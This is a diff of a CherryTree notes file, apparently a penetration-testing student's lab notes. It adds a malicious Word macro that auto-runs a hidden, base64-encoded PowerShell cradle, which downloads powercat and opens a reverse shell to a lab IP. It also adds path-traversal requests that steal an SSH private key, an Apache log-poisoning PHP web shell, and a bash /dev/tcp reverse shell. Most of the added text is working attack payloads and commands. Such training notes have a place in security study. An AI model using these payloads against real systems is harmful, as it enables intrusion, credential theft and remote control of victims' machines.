@@ -173,17 +173,99 @@ ForceChangePassword: Password change for object
 Self (Self-Membership): Add ourselves to for example a group
 </rich_text>
   </node>
-  <node name="Client Side Attacks" unique_id="30" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1741703764" ts_lastsave="1741704817">
-    <rich_text>
+  <node name="Client Side Attacks" unique_id="30" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1741703764" ts_lastsave="1742114393">
+    <rich_text>Macro 
+
 Base64 Encode This
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 IEX(New-Object System.Net.WebClient).DownloadString('</rich_text>
-    <rich_text link="webs http://192.168.119.2/powercat.ps1');powercat">http://192.168.119.2/powercat.ps1');powercat</rich_text>
+    <rich_text link="webs http://192.168.119.2/powercat.ps1');powercat">http://192.168.18.58/powercat.ps1');powercat</rich_text>
     <rich_text> -c 192.168.119.2 -p 4444 -e powershell
 
 
 str = "powershell.exe -nop -w hidden -e SUVYKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vMTkyLjE2OC4xMTkuMi9wb3dlcmNhdC5wczEnKTtwb3dlcmNhdCAtYyAxOTIuMTY4LjExOS4yIC1wIDQ0NDQgLWUgcG93ZXJzaGVsbA=="
-n = 50 for i in range(0, len(str), n): 
-               print("Str = Str + " + '"' + str[i:i+n] + '"')
+n = 50
+
+for i in range(0, len(str), n):
+    print("Str = Str + " + '"' + str[i:i+n] + '"')
+
+
+Macro Code:
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+</rich_text>
+    <rich_text scale="small">Sub AutoOpen()</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">    MyMacro</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">End Sub</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small"> </rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">Sub Document_Open()</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">    MyMacro</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">End Sub</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small"> </rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">Sub MyMacro()</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">    Dim Str As String</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">    </rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">    </rich_text>
+    <rich_text scale="small" weight="heavy">Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small" weight="heavy">        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small" weight="heavy">        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small" weight="heavy">    ...</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small" weight="heavy">        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small" weight="heavy">        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small" weight="heavy">        Str = Str + "A== "</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small"> </rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">    CreateObject("Wscript.Shell").Run Str</rich_text>
+    <rich_text>
+</rich_text>
+    <rich_text scale="small">End Sub</rich_text>
+    <rich_text>
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
+
+
+
+
+
 </rich_text>
   </node>
   <node name="HTB- Optimum" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1720336151" ts_lastsave="1720844574">
@@ -2018,8 +2100,41 @@ target.com/tmp/webshell.php?cmd=1
 
 </rich_text>
   </node>
-  <node name="Client-side Attacks" unique_id="27" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1741593855" ts_lastsave="1741604692">
+  <node name="Client-side Attacks" unique_id="27" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1741593855" ts_lastsave="1742114817">
     <rich_text>exiftool -a -u brochure.pdf
+
+</rich_text>
+  </node>
+  <node name="Information Gathering" unique_id="31" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1742114817" ts_lastsave="1742118911">
+    <rich_text>Absolute Path: An absolute path provides the </rich_text>
+    <rich_text weight="heavy">full</rich_text>
+    <rich_text> address of a file or directory, starting from the root directory.
+Relative Path:  ../../../../../ A relative path specifies the location of a file or directory </rich_text>
+    <rich_text weight="heavy">relative</rich_text>
+    <rich_text> to the current working directory.
+
+
+curl </rich_text>
+    <rich_text link="webs http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa">http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa</rich_text>
+    <rich_text>
+
+mousepad dtkey
+chmod 400 dt_key
+
+ssh -i dt_key -p 2222 offsec@mountaindesserts.com
+
+
+Local file Inclusion : Iclude a file into application running code.
+
+User Agent &lt;?php echo system($_GET['cmd']); ?&gt;
+
+../../../../../../../../../var/log/apache2/access.log
+
+
+bash -c "bash -i &gt;&amp; /dev/tcp/192.168.119.3/4444 0&gt;&amp;1"
+
+Encode it:
+
 
 </rich_text>
   </node>
